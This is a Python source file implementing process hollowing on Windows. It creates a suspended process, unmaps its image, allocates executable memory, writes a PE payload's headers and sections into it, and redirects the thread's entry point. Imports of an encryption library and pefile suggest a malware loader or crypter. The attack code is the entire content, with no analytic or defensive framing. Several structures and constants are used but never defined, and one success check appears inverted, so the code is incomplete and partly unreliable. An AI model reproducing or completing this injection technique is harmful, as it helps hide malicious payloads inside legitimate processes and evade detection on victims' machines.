import base64
import subprocess
from cryptography.fernet import Fernet
from itertools import cycle
import sys, pefile
import ctypes
import os
import time

def handle_error(error_message):
    print (error_message)
    print ("Error Code: ", ctypes.windll.kernel32.GetLastError())
    sys.exit(1)

def create_process(filepath):
    si = STARTUPINFO()
    si.cb = ctypes.sizeof(STARTUPINFO)
    pi = PROCESS_INFORMATION()
    if not ctypes.windll.kernel32.CreateProcessW(None, filepath, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
        handle_error("Failed to create new process")
    print ("[+] Process successfully launched")
    print ("[+] PID : %d\n" %pi.dwProcessId)
    return pi

def unmap_view_of_section(pi, pefilepath):
    if not ctypes.windll.ntdll.NtUnmapViewOfSection(pi.hProcess, LPSTR(pefilepath.OPTIONAL_HEADER.ImageBase)):
        handle_error("Failed to unmap the original exe")
    print ("[+] Unmap View Of Section Succeed")

def allocate_virtual_memory(pi, pe):
    if not ctypes.windll.kernel32.VirtualAllocEx(pi.hProcess, ctypes.c_void_p(pe.OPTIONAL_HEADER.ImageBase), pe.OPTIONAL_HEADER.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE):
        handle_error("Failed to allocate virtual memory")
    print ("[+] Virtual Alloc Succeed")

def write_to_process_memory(pi, pe, buffer_address):
    if not ctypes.windll.kernel32.WriteProcessMemory(pi.hProcess, LPSTR(pe.OPTIONAL_HEADER.ImageBase), ctypes.c_void_p(buffer_address), ctypes.c_int(pe.OPTIONAL_HEADER.SizeOfHeaders), None):
        handle_error("Failed to write to process memory")
    print ("[+] Write Process Memory Succeed")
    print ("Error Code: ", ctypes.windll.kernel32.GetLastError())

def write_sections_to_memory(pi, pe, buffer_address):
    for section in pe.sections:
        if not ctypes.windll.kernel32.WriteProcessMemory(pi.hProcess, LPSTR(pe.OPTIONAL_HEADER.ImageBase+section.VirtualAddress), ctypes.c_void_p(buffer_address+section.PointerToRawData), ctypes.c_int(section.SizeOfRawData), None):
            handle_error("Failed to write to process memory")
        print("[+] Writing Section {} Succeed".format(section.Name.decode('utf-8')))
        print("    - Virtual Address: 0x{:X}".format(pe.OPTIONAL_HEADER.ImageBase + section.VirtualAddress))
        print("    - Raw Data Address: 0x{:X}".format(buffer_address + section.PointerToRawData))
        print("    - Section Size: {}".format(section.SizeOfRawData))

def get_thread_context(pi):
    cx = CONTEXT()
    cx.ContextFlags = 0x10007
    if not ctypes.windll.kernel32.GetThreadContext(pi.hThread, ctypes.byref(cx)):
        handle_error("Failed to get thread context")
    print ("[+] Get Thread Context Succeed")
    return cx

def set_new_thread_context(pi, cx, pe):
    entry_point = pe.OPTIONAL_HEADER.ImageBase + pe.OPTIONAL_HEADER.AddressOfEntryPoint
    cx.Rip = entry_point
    if not ctypes.windll.kernel32.SetThreadContext(pi.hThread, ctypes.byref(cx)):
        handle_error("Failed to set thread context")
    print ("[+] Set Thread Context Succeed")
